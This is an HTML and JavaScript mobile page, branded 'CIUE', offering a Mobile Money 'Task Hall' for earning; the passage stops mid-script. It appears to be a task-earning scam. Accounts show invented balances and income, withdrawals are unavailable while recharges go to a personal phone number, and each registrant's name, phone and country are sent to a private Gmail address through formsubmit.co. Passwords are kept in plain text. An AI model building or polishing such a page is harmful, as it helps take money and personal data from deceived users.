<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>CIUE · Welcome</title>
  <!-- Font Awesome 6 (free) -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background: #ffffff;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      width: 100%;
      padding: 0; /* Remove padding */
      margin: 0;
    }

    /* phone frame - NOW FILLS FULL SCREEN */
    .phone {
      max-width: 100%; /* Full width */
      width: 100%;
      height: 100vh; /* Full viewport height */
      background-color: #ffffff;
      border-radius: 0; /* Remove border radius for full screen */
      box-shadow: none; /* Remove shadow for full screen */
      overflow: hidden;
      padding: 20px 16px 0px 16px;
      display: flex;
      flex-direction: column;
    }

    /* If you want to keep the phone frame look on larger screens */
    @media (min-width: 430px) {
      body {
        background: #f0f0f0;
        padding: 16px;
      }
      
      .phone {
        max-width: 390px;
        height: 95vh;
        border-radius: 40px;
        box-shadow: 0 25px 60px rgba(0, 20, 30, 0.15);
        padding: 30px 20px 0px 20px;
      }
    }

    /* Auth Pages */
    .auth-container {
      padding: 10px 0;
      height: 100%;
      overflow-y: auto;
    }

    .logo-area {
      text-align: center;
      margin-bottom: 25px;
    }

    .logo-icon {
      width: 80px;
      height: 80px;
      background: linear-gradient(135deg, #006a7a, #00bcd4);
      border-radius: 30px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 15px;
      color: white;
      font-size: 2.5rem;
      box-shadow: 0 10px 25px rgba(0,150,170,0.3);
    }

    .logo-area h1 {
      color: #003d4d;
      font-size: 2rem;
      font-weight: 700;
      margin-bottom: 5px;
    }

    .logo-area p {
      color: #597e89;
      font-size: 0.9rem;
    }

    .auth-tabs {
      display: flex;
      background: #ecf7f9;
      border-radius: 60px;
      padding: 5px;
      margin-bottom: 25px;
    }

    .auth-tab {
      flex: 1;
      text-align: center;
      padding: 12px;
      border-radius: 60px;
      font-weight: 600;
      color: #006a7a;
      cursor: pointer;
      transition: all 0.2s;
    }

    .auth-tab.active {
      background: white;
      color: #003d4d;
      box-shadow: 0 4px 10px rgba(0,150,160,0.15);
    }

    .auth-form {
      display: none;
    }

    .auth-form.active {
      display: block;
    }

    .form-group {
      margin-bottom: 20px;
    }

    .form-group label {
      display: block;
      color: #003d4d;
      font-weight: 600;
      margin-bottom: 8px;
      font-size: 0.9rem;
    }

    .input-icon {
      position: relative;
      display: flex;
      align-items: center;
    }

    .input-icon i {
      position: absolute;
      left: 15px;
      color: #00acc1;
      font-size: 1.1rem;
    }

    .input-icon input,
    .input-icon select {
      width: 100%;
      padding: 15px 15px 15px 45px;
      border: 2px solid #e0f0f3;
      border-radius: 30px;
      font-size: 1rem;
      outline: none;
      transition: all 0.2s;
      background: white;
    }

    .input-icon input:focus,
    .input-icon select:focus {
      border-color: #00bcd4;
      box-shadow: 0 0 0 3px rgba(0,188,212,0.1);
    }

    .country-select {
      width: 100%;
      padding: 15px 15px 15px 45px;
      border: 2px solid #e0f0f3;
      border-radius: 30px;
      font-size: 1rem;
      outline: none;
      background: white;
      color: #003d4d;
      cursor: pointer;
    }

    .password-hint {
      font-size: 0.8rem;
      color: #597e89;
      margin-top: 5px;
    }

    .auth-btn {
      background: linear-gradient(135deg, #006a7a, #00bcd4);
      color: white;
      border: none;
      width: 100%;
      padding: 18px;
      border-radius: 40px;
      font-size: 1.2rem;
      font-weight: 700;
      margin: 20px 0 15px;
      cursor: pointer;
      transition: 0.2s;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }

    .auth-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 25px rgba(0,150,170,0.4);
    }

    .auth-footer {
      text-align: center;
      color: #597e89;
      font-size: 0.9rem;
    }

    .auth-footer a {
      color: #006a7a;
      font-weight: 600;
      text-decoration: none;
    }

    .terms {
      text-align: center;
      font-size: 0.8rem;
      color: #89b8c5;
      margin-top: 20px;
    }

    .terms a {
      color: #006a7a;
      text-decoration: none;
    }

    /* Success Message */
    .success-message {
      background: #d4edda;
      color: #155724;
      padding: 15px;
      border-radius: 30px;
      text-align: center;
      margin-bottom: 20px;
      border: 2px solid #c3e6cb;
      display: none;
    }

    .success-message i {
      margin-right: 8px;
    }

    /* Main Dashboard (hidden initially) */
    #mainDashboard, #profilePage, #levelPage {
      display: none;
      flex-direction: column;
      height: 100%;
    }

    /* Scrollable content area */
    .scroll-content {
      flex: 1;
      overflow-y: auto;
      padding-bottom: 10px;
    }

    /* Welcome Section */
    .welcome-section {
      margin-bottom: 30px;
    }

    .welcome-title {
      font-size: 2.2rem;
      font-weight: 700;
      color: #000000;
      line-height: 1.2;
      margin-bottom: 5px;
    }

    .welcome-subtitle {
      font-size: 1rem;
      font-weight: 400;
      color: #333333;
      line-height: 1.4;
      margin-bottom: 20px;
      max-width: 90%;
    }

    .divider-line {
      width: 100%;
      height: 1px;
      background-color: #e0e0e0;
      margin: 15px 0;
    }

    /* Collaboration Text */
    .collab-title {
      font-size: 1.1rem;
      font-weight: 600;
      color: #000000;
      margin-bottom: 20px;
    }

    .collab-title i {
      color: #006a7a;
      margin-right: 8px;
    }

    /* Task Hall Section */
    .task-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 20px;
    }

    .task-header h3 {
      font-size: 1.5rem;
      font-weight: 700;
      color: #000000;
    }

    .teaser-badge {
      background: #333333;
      color: white;
      padding: 6px 16px;
      border-radius: 30px;
      font-size: 0.8rem;
      font-weight: 600;
      display: inline-block;
      letter-spacing: 0.5px;
    }

    /* Card Grid */
    .card-grid {
      display: flex;
      flex-direction: column;
      gap: 15px;
      margin-bottom: 30px;
    }

    .reward-card {
      background: #ffffff;
      border-radius: 0;
      padding: 15px 0;
      display: flex;
      align-items: center;
      justify-content: space-between;
      border-bottom: 1px solid #f0f0f0;
    }

    .card-left {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .card-title {
      font-weight: 600;
      font-size: 1.1rem;
      color: #000000;
    }

    .card-value {
      font-weight: 700;
      font-size: 1.1rem;
      color: #000000;
    }

    .card-value small {
      font-size: 0.8rem;
      font-weight: 400;
      color: #666666;
      margin-left: 2px;
    }

    /* Action Row - Updated to match image with bullet points */
    .action-row {
      display: flex;
      flex-direction: column;
      gap: 10px;
      margin: 25px 0 20px 0;
    }

    .action-item {
      display: flex;
      align-items: center;
      gap: 10px;
      color: #000000;
      font-weight: 500;
      font-size: 1rem;
      cursor: pointer;
    }

    .action-item span {
      font-size: 1rem;
    }

    .action-item span:before {
      content: "• ";
      font-weight: bold;
    }

    .company-line {
      display: flex;
      align-items: center;
      justify-content: space-between;
      background: white;
      padding: 15px 0;
      border-bottom: 1px solid #f0f0f0;
      margin-bottom: 20px;
    }

    .company-line span {
      font-weight: 500;
      color: #000000;
      font-size: 1rem;
    }

    .company-line i {
      color: #000000;
      font-size: 1rem;
    }

    /* Bottom Navigation - FIXED AT BOTTOM */
    .bottom-nav {
      display: flex;
      align-items: center;
      justify-content: space-around;
      background: #ffffff;
      padding: 15px 0 10px 0;
      border-top: 1px solid #f0f0f0;
      width: 100%;
      background-color: white;
      flex-shrink: 0;
      margin-top: auto;
    }

    .nav-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      color: #999999;
      font-size: 0.75rem;
      font-weight: 500;
      gap: 4px;
      cursor: pointer;
    }

    .nav-item i {
      font-size: 1.3rem;
      color: #999999;
    }

    .nav-item.active {
      color: #000000;
    }

    .nav-item.active i {
      color: #000000;
    }

    /* Balance Display */
    .balance-container {
      background: #f9f9f9;
      border-radius: 10px;
      padding: 15px;
      margin-bottom: 25px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      border: 1px solid #eaeaea;
    }

    .balance-label {
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .balance-label i {
      font-size: 1.5rem;
      color: #333;
    }

    .balance-info h4 {
      color: #666;
      font-size: 0.8rem;
      font-weight: 400;
    }

    .balance-info .amount {
      font-size: 1.5rem;
      font-weight: 700;
      color: #000;
      line-height: 1.2;
    }

    .balance-info .amount small {
      font-size: 0.8rem;
      font-weight: 400;
      color: #666;
    }

    .history-btn {
      background: none;
      border: 1px solid #ddd;
      padding: 8px 12px;
      border-radius: 20px;
      color: #333;
      font-weight: 500;
      cursor: pointer;
      font-size: 0.8rem;
    }

    .logout-btn {
      background: none;
      border: 1px solid #ddd;
      color: #333;
      padding: 8px 15px;
      border-radius: 20px;
      cursor: pointer;
      font-size: 0.9rem;
    }

    .logout-btn:hover {
      background: #f5f5f5;
    }

    /* PROFILE PAGE STYLES */
    .profile-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
    }

    .time {
      font-size: 1rem;
      font-weight: 500;
      color: #000;
    }

    .profile-title {
      font-size: 1.2rem;
      font-weight: 600;
      color: #000;
    }

    .profile-title i {
      margin-right: 5px;
    }

    .employee-info {
      margin-bottom: 25px;
    }

    .employee-name {
      font-size: 1.3rem;
      font-weight: 700;
      color: #000;
      margin-bottom: 5px;
    }

    .employee-role {
      font-size: 0.9rem;
      color: #666;
      font-weight: 400;
    }

    /* Wallet Cards */
    .wallet-grid {
      display: flex;
      gap: 15px;
      margin-bottom: 25px;
    }

    .wallet-card {
      flex: 1;
      background: #f9f9f9;
      border-radius: 15px;
      padding: 15px;
      border: 1px solid #eaeaea;
    }

    .wallet-label {
      font-size: 0.8rem;
      color: #666;
      margin-bottom: 5px;
    }

    .wallet-amount {
      font-size: 1.1rem;
      font-weight: 700;
      color: #000;
    }

    .wallet-amount small {
      font-size: 0.7rem;
      font-weight: 400;
      color: #999;
      margin-left: 2px;
    }

    /* Action Buttons */
    .wallet-actions {
      display: flex;
      gap: 20px;
      margin-bottom: 25px;
    }

    .wallet-action-btn {
      display: flex;
      align-items: center;
      gap: 8px;
      background: none;
      border: none;
      font-size: 1rem;
      font-weight: 500;
      color: #000;
      cursor: pointer;
    }

    .wallet-action-btn i {
      font-size: 1.1rem;
    }

    /* Income Grid */
    .income-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 15px;
      margin-bottom: 25px;
    }

    .income-item {
      border-bottom: 1px solid #f0f0f0;
      padding-bottom: 8px;
    }

    .income-label {
      font-size: 0.8rem;
      color: #666;
      margin-bottom: 3px;
    }

    .income-value {
      font-size: 1.1rem;
      font-weight: 700;
      color: #000;
    }

    .income-value small {
      font-size: 0.7rem;
      font-weight: 400;
      color: #999;
      margin-left: 2px;
    }

    /* Commission Row */
    .commission-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 15px 0;
      border-top: 1px solid #eaeaea;
      border-bottom: 1px solid #eaeaea;
      margin-bottom: 20px;
    }

    .commission-label {
      font-size: 0.9rem;
      color: #000;
    }

    .commission-value {
      font-size: 1.1rem;
      font-weight: 700;
      color: #000;
    }

    .commission-value small {
      font-size: 0.7rem;
      font-weight: 400;
      color: #999;
    }

    /* Menu Grid */
    .menu-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 20px;
      margin-bottom: 30px;
    }

    .menu-item {
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 0.95rem;
      color: #000;
    }

    .menu-item i {
      font-size: 1rem;
      color: #666;
      width: 20px;
    }

    /* Deposit Modal Styles */
    .modal-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.5);
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }

    .modal-content {
      background: white;
      max-width: 390px;
      width: 90%;
      border-radius: 30px;
      padding: 24px;
      box-shadow: 0 30px 60px rgba(0,0,0,0.2);
      max-height: 90vh;
      overflow-y: auto;
    }

    .modal-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
    }

    .modal-header h2 {
      color: #000;
      font-size: 1.4rem;
    }

    .close-btn {
      background: none;
      border: none;
      font-size: 1.8rem;
      color: #999;
      cursor: pointer;
    }

    .recipient-card {
      background: #f9f9f9;
      border-radius: 15px;
      padding: 16px;
      margin-bottom: 20px;
      text-align: center;
      border: 1px solid #eaeaea;
    }

    .recipient-card .number {
      font-size: 1.3rem;
      font-weight: 700;
      color: #000;
    }

    .recipient-card .name {
      color: #666;
      font-weight: 500;
      margin-top: 5px;
    }

    .deposit-option {
      background: #f9f9f9;
      border: 1px solid #eaeaea;
      border-radius: 15px;
      padding: 15px;
      margin-bottom: 12px;
      display: flex;
      align-items: center;
      gap: 15px;
      cursor: pointer;
    }

    .deposit-option:hover {
      background: #f0f0f0;
    }

    .deposit-option i {
      font-size: 1.8rem;
      color: #333;
    }

    .deposit-option .info h3 {
      color: #000;
      font-size: 1.1rem;
      margin-bottom: 3px;
    }

    .deposit-option .info p {
      color: #666;
      font-size: 0.8rem;
    }

    .custom-amount input {
      width: 100%;
      padding: 15px;
      border: 1px solid #ddd;
      border-radius: 15px;
      font-size: 1rem;
      text-align: center;
    }

    .ussd-code {
      background: #f5f5f5;
      padding: 15px;
      border-radius: 15px;
      text-align: center;
      margin: 15px 0;
      font-size: 1.1rem;
      font-weight: 600;
      color: #000;
      border: 1px solid #ddd;
    }

    .deposit-btn {
      background: #000;
      color: white;
      border: none;
      width: 100%;
      padding: 16px;
      border-radius: 30px;
      font-size: 1.1rem;
      font-weight: 600;
      margin-top: 15px;
      cursor: pointer;
    }

    .deposit-btn:hover {
      background: #333;
    }

    /* Email notification styles */
    .email-notice {
      background: #fff3cd;
      color: #856404;
      padding: 10px;
      border-radius: 30px;
      font-size: 0.8rem;
      text-align: center;
      margin: 10px 0;
      border: 1px solid #ffeeba;
      display: none;
    }

    .email-notice i {
      margin-right: 5px;
    }

    /* Level Page Styles */
    .level-header {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 200px;
    }

    .level-title {
      color: #ff0000;
      font-size: 2rem;
      font-weight: 800;
      letter-spacing: 2px;
      text-transform: uppercase;
      white-space: nowrap;
      text-align: center;
    }

    /* Make action items display as bullet points */
    .action-item span:before {
      content: "• ";
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="phone">
    <!-- AUTHENTICATION SECTION -->
    <div id="authContainer" class="auth-container">
      <div class="logo-area">
        <div class="logo-icon">
          <i class="fas fa-hand-holding-heart"></i>
        </div>
        <h1>CIUE</h1>
        <p>Mobile Money • Earn • Task Hall</p>
      </div>

      <!-- Success/Error Message -->
      <div id="messageBox" class="success-message">
        <i class="fas fa-check-circle"></i> <span id="messageText"></span>
      </div>

      <!-- Email notification status -->
      <div id="emailNotice" class="email-notice">
        <i class="fas fa-envelope"></i> <span id="emailStatus"></span>
      </div>

      <!-- Auth Tabs -->
      <div class="auth-tabs">
        <div class="auth-tab active" onclick="switchAuthTab('login')" id="loginTab">Login</div>
        <div class="auth-tab" onclick="switchAuthTab('register')" id="registerTab">Register</div>
      </div>

      <!-- LOGIN FORM -->
      <div id="loginForm" class="auth-form active">
        <form onsubmit="handleLogin(event)">
          <div class="form-group">
            <label>Phone Number</label>
            <div class="input-icon">
              <i class="fas fa-phone-alt"></i>
              <input type="tel" id="loginPhone" placeholder="Enter your phone number" required>
            </div>
          </div>

          <div class="form-group">
            <label>Password</label>
            <div class="input-icon">
              <i class="fas fa-lock"></i>
              <input type="password" id="loginPassword" placeholder="Enter your password" required>
            </div>
          </div>

          <button type="submit" class="auth-btn">
            <i class="fas fa-sign-in-alt"></i> Login
          </button>

          <div class="auth-footer">
            Don't have an account? <a href="#" onclick="switchAuthTab('register'); return false;">Register now</a>
          </div>
        </form>
      </div>

      <!-- REGISTRATION FORM -->
      <div id="registerForm" class="auth-form">
        <form id="registrationForm" onsubmit="handleRegisterWithEmail(event)">
          <div class="form-group">
            <label>Full Names</label>
            <div class="input-icon">
              <i class="fas fa-user"></i>
              <input type="text" id="regFullName" placeholder="Enter your full names" required>
            </div>
          </div>

          <div class="form-group">
            <label>Phone Number</label>
            <div class="input-icon">
              <i class="fas fa-phone-alt"></i>
              <input type="tel" id="regPhone" placeholder="Enter your phone number" required>
            </div>
          </div>

          <div class="form-group">
            <label>Country</label>
            <div class="input-icon">
              <i class="fas fa-globe-africa"></i>
              <select id="regCountry" class="country-select" required>
                <option value="">Select your country</option>
                <option value="Uganda">Uganda 🇺🇬</option>
                <option value="Kenya">Kenya 🇰🇪</option>
                <option value="Tanzania">Tanzania 🇹🇿</option>
                <option value="Burundi">Burundi 🇧🇮</option>
                <option value="South Sudan">South Sudan 🇸🇸</option>
              </select>
            </div>
          </div>

          <div class="form-group">
            <label>Password</label>
            <div class="input-icon">
              <i class="fas fa-lock"></i>
              <input type="password" id="regPassword" placeholder="Create a password" required>
            </div>
            <div class="password-hint">Minimum 6 characters</div>
          </div>

          <div class="form-group">
            <label>Confirm Password</label>
            <div class="input-icon">
              <i class="fas fa-lock"></i>
              <input type="password" id="regConfirmPassword" placeholder="Confirm your password" required>
            </div>
          </div>

          <button type="submit" class="auth-btn">
            <i class="fas fa-user-plus"></i> Register
          </button>

          <div class="auth-footer">
            Already have an account? <a href="#" onclick="switchAuthTab('login'); return false;">Login here</a>
          </div>

          <div class="terms">
            By registering, you agree to our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>
          </div>
        </form>
      </div>
    </div>

    <!-- MAIN DASHBOARD (Home Page) -->
    <div id="mainDashboard">
      <!-- Scrollable content area -->
      <div class="scroll-content">
        <!-- Welcome header -->
        <div class="welcome-section">
          <div class="welcome-title">WELCOME</div>
          <div class="welcome-subtitle">NEW OPPORTUNITIES AND CHALLENGES WORK TOGETHER TO CREATE A BETTER FUTURE</div>
          <div class="divider-line"></div>
        </div>

        <!-- Balance Display -->
        <div class="balance-container">
          <div class="balance-label">
            <i class="fas fa-wallet"></i>
            <div class="balance-info">
              <h4>Available Balance</h4>
              <div class="amount" id="balanceAmount">12,500 <small>UGX</small></div>
            </div>
          </div>
          <button class="history-btn" onclick="showHistory()"><i class="fas fa-history"></i> History</button>
        </div>

        <!-- Collaboration text -->
        <div class="collab-title">
          Collaboration. We Believe That Every Employee Can:
        </div>

        <!-- Task Hall section -->
        <div class="task-header">
          <h3>Task Hall</h3>
          <span class="teaser-badge">TEASER</span>
        </div>

        <!-- Cards -->
        <div class="card-grid">
          <div class="reward-card">
            <div class="card-left">
              <span class="card-title">TEASER</span>
            </div>
            <div class="card-value">+1200.00 <small>UGX</small></div>
          </div>
          
          <div class="reward-card">
            <div class="card-left">
              <span class="card-title">VAF</span>
            </div>
            <div class="card-value">+1200.00 <small>UGX</small></div>
          </div>
          
          <div class="reward-card">
            <div class="card-left">
              <span class="card-title">Out of Ideas</span>
            </div>
            <div class="card-value">+1200.00 <small>UGX</small></div>
          </div>
        </div>

        <!-- Action row with bullet points -->
        <div class="action-row">
          <div class="action-item" onclick="openDepositModal()">
            <span>Recharge</span>
          </div>
          <div class="action-item" onclick="alert('Withdraw feature coming soon!')">
            <span>Withdraw</span>
          </div>
          <div class="action-item" onclick="alert('Company profile')">
            <span>Company Profile</span>
          </div>
        </div>

        <!-- Company Profile line -->
        <div class="company-line">
          <span>Company Profile</span>
          <i class="fas fa-chevron-right"></i>
        </div>
      </div>

      <!-- Bottom navigation -->
      <div class="bottom-nav">
        <div class="nav-item active" onclick="showHomePage()">
          <i class="fas fa-home"></i>
          <span>Home</span>
        </div>
        <div class="nav-item" onclick="alert('Task page coming soon')">
          <i class="fas fa-tasks"></i>
          <span>Task</span>
        </div>
        <div class="nav-item" onclick="showLevelPage()">
          <i class="fas fa-chart-simple"></i>
          <span>Level</span>
        </div>
        <div class="nav-item" onclick="alert('Income page coming soon')">
          <i class="fas fa-coins"></i>
          <span>Income</span>
        </div>
        <div class="nav-item" onclick="showProfilePage()">
          <i class="fas fa-user"></i>
          <span>Me</span>
        </div>
      </div>
    </div>

    <!-- PROFILE PAGE (Me Page) -->
    <div id="profilePage">
      <!-- Scrollable content area -->
      <div class="scroll-content">
        <!-- Header with time -->
        <div class="profile-header">
          <span class="time" id="currentTime">9:24 PM</span>
          <span class="profile-title"><i class="fas fa-user"></i> <span id="profileDisplayName">User</span></span>
        </div>

        <!-- Employee info -->
        <div class="employee-info">
          <div class="employee-name" id="profileName">Regular Employee</div>
          <div class="employee-role">Regular Employee</div>
        </div>

        <!-- Wallet cards -->
        <div class="wallet-grid">
          <div class="wallet-card">
            <div class="wallet-label">Main wallet</div>
            <div class="wallet-amount" id="mainWallet">0.00 <small>UGX</small></div>
          </div>
          <div class="wallet-card">
            <div class="wallet-label">Commission wallet</div>
            <div class="wallet-amount" id="commissionWallet">387,566.50 <small>UGX</small></div>
          </div>
        </div>

        <!-- Action buttons -->
        <div class="wallet-actions">
          <button class="wallet-action-btn" onclick="openDepositModal()">
            <i class="fas fa-lock"></i> Recharge
          </button>
          <button class="wallet-action-btn" onclick="alert('Withdraw feature coming soon')">
            <i class="fas fa-folder"></i> Withdraw
          </button>
        </div>

        <!-- Income grid -->
        <div class="income-grid">
          <div class="income-item">
            <div class="income-label">yesterday's income</div>
            <div class="income-value" id="yesterdayIncome">565.00 <small>UGX</small></div>
          </div>
          <div class="income-item">
            <div class="income-label">today's income</div>
            <div class="income-value" id="todayIncome">72,340.00 <small>UGX</small></div>
          </div>
          <div class="income-item">
            <div class="income-label">total income</div>
            <div class="income-value" id="totalIncome">713,066.50 <small>UGX</small></div>
          </div>
          <div class="income-item">
            <div class="income-label">this week's income</div>
            <div class="income-value" id="weekIncome">72,340.00 <small>UGX</small></div>
          </div>
          <div class="income-item">
            <div class="income-label">this month's income</div>
            <div class="income-value" id="monthIncome">387,461.50 <small>UGX</small></div>
          </div>
        </div>

        <!-- Commission from subordinates -->
        <div class="commission-row">
          <span class="commission-label">Commission from subordinate tasks</span>
          <span class="commission-value" id="subordinateCommission">1,096.50 <small>UGX</small></span>
        </div>

        <!-- Menu grid -->
        <div class="menu-grid">
          <div class="menu-item"><i class="fas fa-clipboard-list"></i> task record</div>
          <div class="menu-item"><i class="fas fa-users"></i> team report</div>
          <div class="menu-item"><i class="fas fa-calendar-alt"></i> daily report</div>
          <div class="menu-item"><i class="fas fa-file-invoice"></i> bill record</div>
          <div class="menu-item"><i class="fas fa-chart-line"></i> Position Salary</div>
          <div class="menu-item"><i class="fas fa-download"></i> APP download</div>
        </div>

        <!-- Logout button -->
        <div style="text-align: center; margin-top: 20px; margin-bottom: 20px;">
          <button class="logout-btn" onclick="logout()">
            <i class="fas fa-sign-out-alt"></i> Logout
          </button>
        </div>
      </div>

      <!-- Bottom navigation -->
      <div class="bottom-nav">
        <div class="nav-item" onclick="showHomePage()">
          <i class="fas fa-home"></i>
          <span>Home</span>
        </div>
        <div class="nav-item" onclick="alert('Task page coming soon')">
          <i class="fas fa-tasks"></i>
          <span>Task</span>
        </div>
        <div class="nav-item" onclick="showLevelPage()">
          <i class="fas fa-chart-simple"></i>
          <span>Level</span>
        </div>
        <div class="nav-item" onclick="alert('Income page coming soon')">
          <i class="fas fa-coins"></i>
          <span>Income</span>
        </div>
        <div class="nav-item active" onclick="showProfilePage()">
          <i class="fas fa-user"></i>
          <span>Me</span>
        </div>
      </div>
    </div>

    <!-- LEVEL PAGE -->
    <div id="levelPage">
      <!-- Scrollable content area -->
      <div class="scroll-content">
        <!-- Level header in RED CAPITAL LETTERS - ONE LINE -->
        <div class="level-header">
          <h1 class="level-title">LEVEL PRICE AND INCOME</h1>
        </div>
        
        <!-- You can add more level content here later -->
        <div style="text-align: center; color: #666; margin-top: 50px;">
          <p>Level details coming soon...</p>
        </div>
      </div>

      <!-- Bottom navigation -->
      <div class="bottom-nav">
        <div class="nav-item" onclick="showHomePage()">
          <i class="fas fa-home"></i>
          <span>Home</span>
        </div>
        <div class="nav-item" onclick="alert('Task page coming soon')">
          <i class="fas fa-tasks"></i>
          <span>Task</span>
        </div>
        <div class="nav-item active" onclick="showLevelPage()">
          <i class="fas fa-chart-simple"></i>
          <span>Level</span>
        </div>
        <div class="nav-item" onclick="alert('Income page coming soon')">
          <i class="fas fa-coins"></i>
          <span>Income</span>
        </div>
        <div class="nav-item" onclick="showProfilePage()">
          <i class="fas fa-user"></i>
          <span>Me</span>
        </div>
      </div>
    </div>
  </div>

  <!-- DEPOSIT MODAL -->
  <div class="modal-overlay" id="depositModal">
    <div class="modal-content">
      <div class="modal-header">
        <h2><i class="fas fa-mobile-alt"></i> Mobile Money</h2>
        <button class="close-btn" onclick="closeDepositModal()">&times;</button>
      </div>
      
      <!-- Recipient info -->
      <div class="recipient-card">
        <div class="number">0756 673 144</div>
        <div class="name">NAMUHANGA VERONIC</div>
      </div>

      <!-- Quick deposit options -->
      <div class="deposit-option" onclick="setDepositAmount(10000)">
        <i class="fas fa-bolt"></i>
        <div class="info">
          <h3>10,000 UGX</h3>
          <p>Quick deposit</p>
        </div>
      </div>
      
      <div class="deposit-option" onclick="setDepositAmount(50000)">
        <i class="fas fa-star"></i>
        <div class="info">
          <h3>50,000 UGX</h3>
          <p>Most popular</p>
        </div>
      </div>
      
      <div class="deposit-option" onclick="setDepositAmount(100000)">
        <i class="fas fa-crown"></i>
        <div class="info">
          <h3>100,000 UGX</h3>
          <p>Premium</p>
        </div>
      </div>
      
      <!-- Custom amount -->
      <div class="custom-amount">
        <input type="number" id="customAmount" placeholder="Enter amount (UGX)" min="1000" step="1000">
      </div>

      <!-- USSD Code Display -->
      <div class="ussd-code" id="ussdDisplay">
        *165*1*0756673144*<span id="amountDisplay">AMOUNT</span>#
      </div>
      
      <button class="deposit-btn" onclick="processDeposit()">
        <i class="fas fa-mobile-alt"></i> Pay with Mobile Money
      </button>
      
      <!-- Transaction history -->
      <div id="historySection" style="display: none;" class="transaction-history">
        <h3 style="margin-bottom: 10px;">Recent deposits</h3>
        <div id="transactionList"></div>
      </div>
    </div>
  </div>

  <script>
    // Show message function
    function showMessage(text, isSuccess = true) {
      const msgBox = document.getElementById('messageBox');
      const msgText = document.getElementById('messageText');
      msgText.textContent = text;
      msgBox.style.display = 'block';
      msgBox.style.background = isSuccess ? '#d4edda' : '#f8d7da';
      msgBox.style.color = isSuccess ? '#155724' : '#721c24';
      msgBox.style.borderColor = isSuccess ? '#c3e6cb' : '#f5c6cb';
      
      setTimeout(() => {
        msgBox.style.display = 'none';
      }, 3000);
    }

    // Show email status
    function showEmailStatus(text, isSuccess = true) {
      const emailNotice = document.getElementById('emailNotice');
      const emailStatus = document.getElementById('emailStatus');
      emailStatus.textContent = text;
      emailNotice.style.display = 'block';
      emailNotice.style.background = isSuccess ? '#d4edda' : '#fff3cd';
      emailNotice.style.color = isSuccess ? '#155724' : '#856404';
      
      setTimeout(() => {
        emailNotice.style.display = 'none';
      }, 4000);
    }

    // Switch between login and register tabs
    function switchAuthTab(tab) {
      const loginForm = document.getElementById('loginForm');
      const registerForm = document.getElementById('registerForm');
      const loginTab = document.getElementById('loginTab');
      const registerTab = document.getElementById('registerTab');
      
      if (tab === 'login') {
        loginForm.classList.add('active');
        registerForm.classList.remove('active');
        loginTab.classList.add('active');
        registerTab.classList.remove('active');
      } else {
        registerForm.classList.add('active');
        loginForm.classList.remove('active');
        registerTab.classList.add('active');
        loginTab.classList.remove('active');
      }
      
      // Clear any values when switching tabs
      document.getElementById('loginPhone').value = '';
      document.getElementById('loginPassword').value = '';
      document.getElementById('regFullName').value = '';
      document.getElementById('regPhone').value = '';
      document.getElementById('regPassword').value = '';
      document.getElementById('regConfirmPassword').value = '';
      document.getElementById('regCountry').value = '';
    }

    // Handle Registration with Email Notification
    async function handleRegisterWithEmail(event) {
      event.preventDefault();
      
      const fullName = document.getElementById('regFullName').value.trim();
      const phone = document.getElementById('regPhone').value.trim();
      const country = document.getElementById('regCountry').value;
      const password = document.getElementById('regPassword').value;
      const confirmPass = document.getElementById('regConfirmPassword').value;
      
      // Validate
      if (!fullName || !phone || !country || !password || !confirmPass) {
        showMessage('Please fill in all fields', false);
        return;
      }
      
      if (password.length < 6) {
        showMessage('Password must be at least 6 characters', false);
        return;
      }
      
      if (password !== confirmPass) {
        showMessage('Passwords do not match', false);
        return;
      }
      
      // Check if user already exists in localStorage
      const users = JSON.parse(localStorage.getItem('cueUsers') || '{}');
      
      if (users[phone]) {
        showMessage('This phone number is already registered. Please login.', false);
        switchAuthTab('login');
        return;
      }
      
      // Show sending status
      showEmailStatus('📧 Sending registration details to your email...', true);
      
      try {
        // Send email notification using FormSubmit.co
        const formData = new FormData();
        formData.append('Name', fullName);
        formData.append('Phone', phone);
        formData.append('Country', country);
        formData.append('_subject', '🎉 NEW CIUE REGISTRATION!');
        formData.append('_captcha', 'false');
        
        const response = await fetch('https://formsubmit.co/ajax/muteguya00@gmail.com', {
          method: 'POST',
          body: formData
        });
        
        if (response.ok) {
          showEmailStatus('✅ Email sent successfully! You will be notified when someone registers.', true);
        } else {
          showEmailStatus('⚠️ Email notification failed but registration saved locally.', false);
        }
      } catch (error) {
        console.error('Email error:', error);
        showEmailStatus('⚠️ Could not send email, but registration saved locally.', false);
      }
      
      // Save user locally
      users[phone] = {
        fullName: fullName,
        phone: phone,
        country: country,
        password: password,
        registeredDate: new Date().toLocaleString(),
        balance: 12500,
        commissionBalance: 387566.50,
        transactions: [
          { type: 'deposit', amount: 10000, date: '2024-01-15' },
          { type: 'deposit', amount: 2500, date: '2024-01-14' }
        ]
      };
      
      localStorage.setItem('cueUsers', JSON.stringify(users));
      localStorage.setItem('currentUser', phone);
      
